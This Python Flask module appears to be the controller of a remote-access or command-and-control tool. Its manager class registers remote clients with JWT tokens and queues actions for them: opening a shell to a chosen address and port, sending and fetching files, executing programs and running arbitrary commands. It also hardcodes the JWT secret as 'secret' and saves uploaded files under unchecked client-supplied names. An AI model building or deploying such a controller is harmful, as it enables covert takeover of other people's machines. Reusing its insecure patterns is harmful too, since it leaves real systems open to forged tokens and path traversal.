from flask import request, send_file, send_from_directory, safe_join, abort
import uuid
import time
import jwt
import os.path
import base64
import collections
from threading import Thread
from myclient import client
import logging
import sys 


MAX_LEN_JOB=10
JWT_SECRET="secret"

def encodeJwt(token):
    return jwt.encode(token,JWT_SECRET,'HS256')

def decodeJwt(token):
    try:
        result=jwt.decode(token,JWT_SECRET,'HS256')
        return result,True
    except jwt.exceptions.PyJWTError:
        return None,False

class manager:
    def __init__(self):
        #UID->client
        #self.new_uid='0'
        self.clientList=collections.OrderedDict()
        

    def getClients(self):
        return self.clientList

    def register(self,ip=""):
        new_uid=uuid.uuid4().hex

        c=client(new_uid,ip)
        self.clientList[new_uid]=c
        print("registrado",self.clientList)
        #a = self.new_uid
        #self.new_uid= str(int(self.new_uid)+1)
        return encodeJwt({"uid":new_uid}),True      

    def getCmd(self,uid):
        return self.clientList[uid].getCmd()
        
    def getFile(self,uid):
        print("getting gui",self.clientList[uid])
        return self.clientList[uid].getFile()

    def report(self,uid,result):
        print("reporting",uid,result)
        self.clientList[uid].report(result) 

    def saveFile(self,uid,file):
        #TODO makes checks and other stuffs
        file.save("uploads/"+file.filename)
        return "Ok",200

    def getOK(self,uid):
        self.clientList[uid].setOK=False

    ########################## actions RPC ############################
    def getClientByIndex(self,clientUid):
        try:
            return list(self.clientList.items())[clientUid][1]
        except:
            return None
            
    def displayClients(self):
        r ="displaying clients: \n"
        #print("dict client:",self.clientList)
        
        for i in range(len(self.clientList.items())):
            r+="cliente %i  = %s \n"%(i,self.getClientByIndex(i))
        
        return r

    def abrirShell(self,clientuid,addr,port):
        
        if (self.getClientByIndex(clientuid)):
            self.getClientByIndex(clientuid).openShell(addr,port)
        else:
            print("client don't find")

    def sendFile(self,fname,clientuid=0):
        if (self.getClientByIndex(clientuid)):
            self.getClientByIndex(clientuid).sendFile(fname)
        else:
            print("client don't find")

    def downloadFile(self,fname,clientuid=0):
        if (self.getClientByIndex(clientuid)):
            self.getClientByIndex(clientuid).writefile(fname)
        else:
            print("client don't find")


    def executeProgram(self,fname,clientuid=0):
        if (self.getClientByIndex(clientuid)):
            self.getClientByIndex(clientuid).executeProgram(fname)
        else:
            print("client don't find")

    def runCommand(self,cmd,clientuid=0):
        cmdList=[cmd]
        if (self.getClientByIndex(clientuid)):
            self.getClientByIndex(clientuid).runCommand(cmdList)
        else:
            print("client don't find")
            
    
    def testServer(self):
        return "server ok"
    
    def testClient(self,clientuid=0):
        if (self.getClientByIndex(clientuid)):
            if (self.getClientByIndex(clientuid).clientOK()):
                return "Client ok"
            else:
                return "Client don't ok"
        else:
            return "client don't find"


















